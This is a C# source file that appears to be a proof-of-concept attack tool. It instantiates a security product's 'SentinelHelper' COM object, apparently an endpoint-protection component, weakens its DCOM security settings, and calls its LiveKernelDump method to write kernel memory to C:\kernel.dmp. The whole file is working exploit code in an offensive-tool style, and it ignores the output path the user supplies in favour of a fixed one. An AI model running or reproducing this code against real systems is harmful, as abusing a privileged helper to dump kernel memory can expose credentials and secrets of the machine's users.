﻿using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("Ole32.dll", CharSet = CharSet.Auto)]
    public static extern int CoSetProxyBlanket(
        IntPtr pProxy,
        uint dwAuthnSvc,
        uint dwAuthzSvc,
        uint pServerPrincName,
        uint dwAuthLevel,
        uint dwImpLevel,
        IntPtr pAuthInfo,
        uint dwCapabilities
    );
    public static int SetSecurity(object objDCOM)
    {
        IntPtr dispatchInterface = Marshal.GetIDispatchForObject(objDCOM);
        int hr = CoSetProxyBlanket(
            dispatchInterface,
            0xffffffff,
            0xffffffff,
            0xffffffff,
            0, // Authentication Level
            3, // Impersonation Level
            IntPtr.Zero,
            64
        );
        return hr;
    }

    public static object GetHelperComObject()
    {
        try
        {
            Console.WriteLine("[+] Initializing SentinelHelper COM object...");
            object sentinelHelper = Activator.CreateInstance(Type.GetTypeFromProgID("SentinelHelper.1"));
            Console.WriteLine("[+] SentinelHelper COM object initialized successfully!");
            SetSecurity(sentinelHelper);
            return sentinelHelper;
        }
        catch
        {
            return null;
        }
    }

    public static void DoLiveKernelDump(string outPath)
    {
        try
        {
            Console.WriteLine($"[+] Trying to dump kernel to {outPath}...");
            dynamic sentinelHelper = GetHelperComObject();
            sentinelHelper.LiveKernelDump(outPath);
            Console.WriteLine("[+] Successfully dumped kernel!");
        }
        catch
        {
            Console.WriteLine("[!] Uh-oh, something went wrong!");
        }
    }

    public static void PrintHelp()
    {
        Console.WriteLine("[+] Usage: Dump.exe --output C:\\kernel.dmp");
    }

    static void Main(string[] args)
    {
        if (args.Length == 2)
        {
            if (args[0] == "--output" && args[1].StartsWith("C:\\"))
            {
                DoLiveKernelDump("C:\\kernel.dmp");
            }
            else
            {
                PrintHelp();
            }
        }
        else
        {
            PrintHelp();
        }
    }
}
